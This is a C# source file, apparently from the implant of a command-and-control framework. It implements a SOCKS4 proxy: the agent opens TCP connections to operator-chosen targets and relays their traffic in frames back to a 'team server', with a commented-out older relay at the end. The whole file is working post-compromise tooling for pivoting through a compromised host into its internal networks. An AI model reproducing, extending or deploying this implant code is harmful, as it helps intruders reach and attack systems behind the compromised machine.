using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Agent.Helpers;
using System.Net;
using Shared;
using BinarySerializer;
using System.Threading;
using System.IO;

namespace Agent.Service
{

    public sealed class SocksClient
    {
        public string Id { get; private set; }

        public Agent Agent { get; private set; }
        private TcpClient _tcp;
        private readonly ManualResetEvent _signal = new ManualResetEvent(false);
        private ConcurrentQueue<byte[]> _dataQueue = new ConcurrentQueue<byte[]>();

        public SocksClient(TcpClient client, string id, Agent agent)
        {
            this.Id = id;
            this._tcp = client;
            Agent=agent;   
        }

        public void QueueData(byte[] data)
        {
            _dataQueue.Enqueue(data);
        }

        public bool TryDequeue(out byte[] data)
        {
            return _dataQueue.TryDequeue(out data);
        }

        public void Disconnect()
        {
            try
            {
                this._tcp.Close();
            }
            finally { }
        }

        public bool DataAvailable()
        {
            return this._tcp.DataAvailable();
        }

        public bool IsConnected()
        {
            return this._tcp.Connected;
        }

        public async Task<byte[]> ReadStream()
        {
            var stream = this._tcp.GetStream();
            const int bufSize = 1024;
            int read;

            using (var ms = new MemoryStream())
            {
                do
                {
                    var buf = new byte[bufSize];
                    read = await stream.ReadAsync(buf, 0, bufSize);

                    if (read == 0)
                        break;

                    await ms.WriteAsync(buf, 0, read);

                } while (read >= bufSize);

                return ms.ToArray();
            }
        }

        public async Task WriteStream(byte[] data)
        {
            var stream = this._tcp.GetStream();
            await stream.WriteAsync(data, 0, data.Length);
        }
    }
    internal interface IProxyService
    {
        Task HandleSocksPacket(Socks4Packet packet, Agent agent);
    }
    internal class ProxyService : IProxyService
    {
        private readonly IFrameService _frameService;
        public ProxyService(IFrameService frameService)
        {
            _frameService = frameService;
        }

        private readonly Dictionary<string, SocksClient> _socksClients = new Dictionary<string, SocksClient>();
        public async Task HandleSocksPacket(Socks4Packet packet, Agent agent)
        {
            switch (packet.Type)
            {
                case Socks4Packet.PacketType.CONNECT:
                    {
                        try
                        {
                            var request = packet.Data.BinaryDeserializeAsync<Socks4ConnectRequest>().Result;
                            await HandleSocksConnect(request, agent);
                        }
                        catch (Exception ex)
                        {
                            DisconnectSocksClient(packet.Id);
                        }

                        break;
                    }

                case Socks4Packet.PacketType.DATA:
                    {
                        await HandleSocksData(packet, agent);
                        break;
                    }

                case Socks4Packet.PacketType.DISCONNECT:
                    {
                        DisconnectSocksClient(packet.Id);
                        break;
                    }

                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private async Task HandleSocksConnect(Socks4ConnectRequest request, Agent agent)
        {
            IPAddress target;

            if (!string.IsNullOrWhiteSpace(request.DestinationDomain))
            {
                var lookup = await Dns.GetHostEntryAsync(request.DestinationDomain);
                target = lookup.AddressList.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork);
            }
            else
            {
                target = new IPAddress(request.DestinationAddress);
            }

            var client = new TcpClient();

            try
            {
                await client.ConnectAsync(target, request.DestinationPort);
            }
            catch (SocketException ex)
            {
                var p = new Socks4Packet(request.Id, Socks4Packet.PacketType.CONNECT, false.BinarySerializeAsync().Result);
                var f = this._frameService.CreateFrame(agent.MetaData.Id, NetFrameType.Socks, p);
                await agent.SendFrame(f);
                return;
            }

            if (_socksClients.ContainsKey(request.Id))
            {
                _socksClients[request.Id].Disconnect();
                _socksClients.Remove(request.Id);
            }

            var sockClient = new SocksClient(client, request.Id, agent);
            _socksClients.Add(request.Id, sockClient);

            // send packet back in acknowledgement
            var packet = new Socks4Packet(request.Id, Socks4Packet.PacketType.CONNECT, true.BinarySerializeAsync().Result);
            var frame = this._frameService.CreateFrame(agent.MetaData.Id, NetFrameType.Socks, packet);
            await agent.SendFrame(frame);

            var thread = new Thread(HandleClient);
            thread.Start(sockClient);
        }

        private async void HandleClient(object obj)
        {
            if (!(obj is SocksClient))
                return;

            var client = (SocksClient)obj;

            try
            {
                while (client.IsConnected())
                {
                    // if client has data
                    if (client.DataAvailable())
                    {
                        // read it
                        var data = await client.ReadStream();

#if DEBUG
                        Debug.WriteLine($"SOCKS [{client.Id}] : Handling Socks Data, Reponse [{data.Length}]");
#endif

                        // send back to team server
                        var packet = new Socks4Packet(client.Id, Socks4Packet.PacketType.DATA, data);
                        var frame = this._frameService.CreateFrame(client.Agent.MetaData.Id, NetFrameType.Socks, packet);
                        await client.Agent.SendFrame(frame);
                        // send to the drone
                    }

                    byte[] request;
                    if (client.TryDequeue(out request))
                    {
                        await client.WriteStream(request);

#if DEBUG
                        Debug.WriteLine($"SOCKS [{client.Id}] : Handling Socks Data, Request [{request.Length}]");
#endif

                    }

                    await Task.Delay(100);
                }
            }
            catch { }

            // send a disconnect
#if DEBUG
            Debug.WriteLine($"SOCKS [{client.Id}] : Handling Socks Data => Disconnect");
#endif
            var p = new Socks4Packet(client.Id, Socks4Packet.PacketType.DISCONNECT);
            var f = this._frameService.CreateFrame(client.Agent.MetaData.Id, NetFrameType.Socks, p);
            await client.Agent.SendFrame(f);
        }



        private async Task HandleSocksData(Socks4Packet inbound, Agent agent)
        {
#if DEBUG
            Debug.WriteLine($"SOCKS [{inbound.Id}] : Handling Socks Data, Data [{inbound.Data.Length}]");
#endif
            if (_socksClients.TryGetValue(inbound.Id, out var client))
            {

                    // write data
                    client.QueueData(inbound.Data);
#if DEBUG
                    Debug.WriteLine($"SOCKS [{inbound.Id}] : Handling Socks Data, Enqueue [{inbound.Data.Length}]");
#endif
                
            }
        }

        private void DisconnectSocksClient(string id)
        {
            if (!_socksClients.TryGetValue(id, out var client))
                return;

            client.Disconnect();
            _socksClients.Remove(id);
        }
        /*protected ConcurrentQueue<SocksMessage> _InboudMessages = new ConcurrentQueue<SocksMessage>();
        protected ConcurrentQueue<SocksMessage> _OutboundMessages = new ConcurrentQueue<SocksMessage>();

        Dictionary<string, TcpClient> Clients = new Dictionary<string, TcpClient>();

        public override string ServiceName => "Socks Proxy";

        public ProxyService()
        {
        }

        public override async Task Process()
        {
            List<string> toRemove = new List<string>();

            //Process received Messages
            var msgReceived = this.DequeueAllRequest();
            foreach (var id in msgReceived.Keys)
            {
                try
                {
                    var messages = msgReceived[id];

                    if (messages.Any(m => !m.ConnexionState))
                        toRemove.Add(id);
                    bool newConnection = messages.Any(m => m.ConnexionState && m.Data == null);

                    while (messages.Any())
                    {
                        var received = messages.Dequeue();

                        //connection
                        if (received.Data == null && received.ConnexionState)
                        {
                            Debug.WriteLine($"New connection : {id}");
                            var destination = new TcpClient();
                            var destAddres = id.Split('|')[1];

                            if (!destination.ConnectAsync(destAddres.Split(':')[0], int.Parse(destAddres.Split(':')[1])).Wait(500))
                            {
                                this.EnqueueResponse(new SocksMessage()
                                {
                                    Source = id,
                                    ConnexionState = false,
                                });
                                Debug.WriteLine($"Connexion refused {id}");
                            }
                            else
                            {
                                if (!Clients.ContainsKey(id))
                                    Clients.Add(id, destination);
                                else
                                    Clients[id] = destination;

                                this.EnqueueResponse(new SocksMessage()
                                {
                                    Source = id,
                                    ConnexionState = true,
                                });

                                Debug.WriteLine($"Connexion accepted {id}");
                            }
                        }
                        if (received.Data == null && !received.ConnexionState)
                        {
                            //disconnection
                            Debug.WriteLine($"Connexion closed {id} (from source)");
                            if (Clients.ContainsKey(id))
                            {
                                var dest = Clients[id];
                                toRemove.Add(id);
                                dest.Close();
                            }

                        }

                        //data to send
                        if (!string.IsNullOrEmpty(received.Data))
                        {
                            if (!Clients.ContainsKey(id))
                            {
                                Debug.WriteLine($"Data received but no client with id {id}");
                                break;
                            }

                            var dest = Clients[id];
                            var data = Convert.FromBase64String(received.Data);
                            dest.SendMessage(data);
                            Debug.WriteLine($"Data sent to {id} ({data.Length})");
                        }
                    }
                }
                catch (Exception ex)
                {
                    toRemove.Add(id);
                }
            }

            //Get clients responses and send them
            foreach (var id in Clients.Keys)
            {
                try
                {
                    var dest = Clients[id];
                    if (dest.DataAvailable())
                    {
                        var data = dest.ReceivedData();
                        this.EnqueueResponse(new SocksMessage()
                        {
                            Source = id,
                            Data = Convert.ToBase64String(data),
                            ConnexionState = true,
                        });
                        Debug.WriteLine($"Data received from {id} ({data.Length})");
                    }
                }
                catch (Exception ex)
                {
                    toRemove.Add(id);
                    this.EnqueueResponse(new SocksMessage()
                    {
                        Source = id,
                        ConnexionState = false,
                    });
                    Debug.WriteLine($"Connexion closed {id} (from dest - exception)");
                }
            }

            //Cleanup closed clients
            foreach (var id in toRemove.ToList())
                Clients.Remove(id);
        }

        public void EnqueueResponse(SocksMessage mess)
        {
            this._OutboundMessages.Enqueue(mess);
        }

        public List<SocksMessage> GetResponses()
        {
            var list = new List<SocksMessage>();
            while (this._OutboundMessages.Any())
            {
                this._OutboundMessages.TryDequeue(out var mes);
                list.Add(mes);
            }

            return list;
        }

        public void AddRequests(IEnumerable<SocksMessage> messages)
        {
            foreach (var item in messages)
            {
                _InboudMessages.Enqueue(item);
            }
        }

        public SocksMessage DequeueRequest()
        {
            var q = _InboudMessages;
            if (!q.Any())
                return null;
            q.TryDequeue(out var mess);
            return mess;
        }

        public Dictionary<string, Queue<SocksMessage>> DequeueAllRequest()
        {
            var dico = new Dictionary<string, Queue<SocksMessage>>();

            var q = _InboudMessages;
            if (!q.Any())
                return dico;
            q.TryDequeue(out var mess);
            if (dico.ContainsKey(mess.Source))
                dico[mess.Source].Enqueue(mess);
            else
            {
                var newQueue = new Queue<SocksMessage>();
                newQueue.Enqueue(mess);
                dico.Add(mess.Source, newQueue);
            }
            return dico;
        }*/

    }
}